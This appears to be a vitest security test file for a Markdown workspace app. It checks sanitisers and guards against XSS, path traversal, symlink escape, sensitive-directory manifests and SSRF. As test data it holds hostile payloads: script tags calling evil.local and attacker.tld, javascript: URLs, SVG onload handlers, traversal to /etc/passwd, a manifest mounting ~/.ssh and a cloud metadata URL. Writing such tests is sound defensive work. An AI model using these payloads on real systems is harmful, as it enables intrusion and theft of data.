import fs from 'fs'
import os from 'os'
import path from 'path'
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { MultiRootPathGuard, isSensitiveSystemPath, isStrictSubpath } from '../../main/security/path-guard'
import { MultiRootRegistry } from '../../main/workspace/multi-root-registry'
import { renderMarkdownDocument, isSafeUrl } from '../../shared/markdown/pipeline'
import { sanitizeSvgContent } from '../../shared/serialization/excalidraw-svg'
import { sanitizeAndCleanAIOutput } from '../../main/ai/prompts'

describe('Security Controls & Threat Model Verification', () => {
  let tmpBase: string
  let rootADir: string
  let rootBDir: string
  let outsideDir: string
  let guard: MultiRootPathGuard

  beforeEach(() => {
    tmpBase = fs.mkdtempSync(path.join(os.tmpdir(), 'klartext-sec-test-'))
    rootADir = path.join(tmpBase, 'root-a')
    rootBDir = path.join(tmpBase, 'root-b')
    outsideDir = path.join(tmpBase, 'outside-secret')
    fs.mkdirSync(rootADir, { recursive: true })
    fs.mkdirSync(rootBDir, { recursive: true })
    fs.mkdirSync(outsideDir, { recursive: true })
    fs.writeFileSync(path.join(outsideDir, 'secret.txt'), 'TOP_SECRET', 'utf-8')

    guard = new MultiRootPathGuard()
    guard.registerRoot({ id: 'root-a', name: 'Root A', path: rootADir })
    guard.registerRoot({ id: 'root-b', name: 'Root B', path: rootBDir })
  })

  afterEach(() => {
    fs.rmSync(tmpBase, { recursive: true, force: true })
  })

  it('1. sanitizes malicious Markdown containing <script>, <img onerror=...>, and iframe tags', async () => {
    const hostileMd = `
# Hostile Document
<script>window.pwned = true; fetch('http://evil.local/steal');</script>
<img src="x" onerror="alert('xss')" />
<iframe src="javascript:alert(1)"></iframe>
<a href="javascript:alert('clicked')">Click me</a>
`
    const rendered = await renderMarkdownDocument(hostileMd, { rootId: 'root-a' })
    expect(rendered.html).not.toContain('<script')
    expect(rendered.html).not.toContain('onerror=')
    expect(rendered.html).not.toContain('<iframe')
    expect(rendered.html).not.toContain('javascript:')
  })

  it('2. blocks dangerous URL schemes (javascript:, vbscript:, data:text/html, file:///)', async () => {
    expect(isSafeUrl('javascript:alert(1)')).toBe(false)
    expect(isSafeUrl('vbscript:msgbox(1)')).toBe(false)
    expect(isSafeUrl('data:text/html,<script>alert(1)</script>')).toBe(false)
    expect(isSafeUrl('file:///etc/passwd')).toBe(false)
    expect(isSafeUrl('https://github.com/klartext')).toBe(true)

    const mdWithFileScheme = `[Read passwd](file:///etc/passwd) and ![Bad](javascript:evil())`
    const rendered = await renderMarkdownDocument(mdWithFileScheme, { rootId: 'root-a' })
    expect(rendered.html).not.toContain('file:///etc/passwd')
    expect(rendered.html).not.toContain('javascript:evil')
  })

  it('3. blocks forged IPC path traversal attempts outside mounted roots (../../../../etc/passwd and cross-root)', () => {
    expect(() => guard.resolveScopedPath('root-a', '../../../../etc/passwd')).toThrow(/Security rejection/)
    expect(() => guard.resolveScopedPath('root-a', '..\\..\\Windows\\System32\\cmd.exe')).toThrow(
      /Security rejection/
    )
    expect(() => guard.resolveScopedPath('root-a', '../root-b/notes.md')).toThrow(
      /Security rejection/
    )
    expect(() => guard.resolveScopedPath('unmounted-root', 'notes.md')).toThrow(
      /Security rejection/
    )

    const validResolved = guard.resolveScopedPath('root-a', 'docs/architecture.md')
    expect(isStrictSubpath(fs.realpathSync(rootADir), validResolved)).toBe(true)
  })

  it('4. rejects malformed .klartext-workspace manifests attempting to mount sensitive system directories', async () => {
    expect(isSensitiveSystemPath('/etc')).toBe(true)
    expect(isSensitiveSystemPath(path.join(os.homedir(), '.ssh'))).toBe(true)

    const registry = new MultiRootRegistry(tmpBase)
    const maliciousManifestPath = path.join(tmpBase, 'malicious.klartext-workspace')
    fs.writeFileSync(
      maliciousManifestPath,
      JSON.stringify({
        version: 1,
        name: 'Evil Workspace',
        roots: [
          {
            id: 'root-ssh',
            name: 'SSH Keys',
            path: path.join(os.homedir(), '.ssh'),
            assetDir: 'assets'
          }
        ]
      }),
      'utf-8'
    )

    await expect(registry.loadManifestFromFile(maliciousManifestPath)).rejects.toThrow(
      /Security rejection/
    )
  })

  it('5. sanitizes script-injected SVG content in Excalidraw and Mermaid embeds', () => {
    const dirtySvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>evil()</script><foreignObject><iframe></iframe></foreignObject><rect width="10" height="10" onclick="steal()" /></svg>`
    const clean = sanitizeSvgContent(dirtySvg)
    expect(clean).not.toContain('<script')
    expect(clean).not.toContain('<foreignObject')
    expect(clean).not.toContain('onload=')
    expect(clean).not.toContain('onclick=')
  })

  it('6. blocks symlink escape attempts outside a mounted root boundary', () => {
    const symlinkPath = path.join(rootADir, 'escape-link')
    fs.symlinkSync(outsideDir, symlinkPath)

    expect(() => guard.resolveScopedPath('root-a', 'escape-link/secret.txt')).toThrow(
      /Symlink escape detected/
    )
  })

  it('7. enforces SSRF loopback validation on Local AI endpoints unless explicitly overridden', () => {
    expect(() =>
      MultiRootPathGuard.validateLoopbackUrl('http://127.0.0.1:11434', false)
    ).not.toThrow()
    expect(() =>
      MultiRootPathGuard.validateLoopbackUrl('http://localhost:1234/v1', false)
    ).not.toThrow()
    expect(() =>
      MultiRootPathGuard.validateLoopbackUrl('http://169.254.169.254/latest/meta-data', false)
    ).toThrow(/Security SSRF rejection/)
    expect(() =>
      MultiRootPathGuard.validateLoopbackUrl('http://192.168.1.50:11434', false)
    ).toThrow(/Security SSRF rejection/)
  })

  it('8. strips reasoning <think> blocks, conversational filler, and script tags from untrusted AI outputs', () => {
    const rawAiResponse = `<think>Reasoning about prompt injection...</think>
Sure! Here is the revised text:
\`\`\`markdown
# Säkerhetsgranskning
Detta är ett **användargränssnitt** utan särskrivning.
<script>fetch('http://attacker.tld')</script>
\`\`\``
    const cleaned = sanitizeAndCleanAIOutput(rawAiResponse)
    expect(cleaned).not.toContain('<think>')
    expect(cleaned).not.toContain('Sure! Here is')
    expect(cleaned).not.toContain('```markdown')
    expect(cleaned).not.toContain('<script>')
    expect(cleaned).toContain('# Säkerhetsgranskning')
    expect(cleaned).toContain('**användargränssnitt**')
  })
})
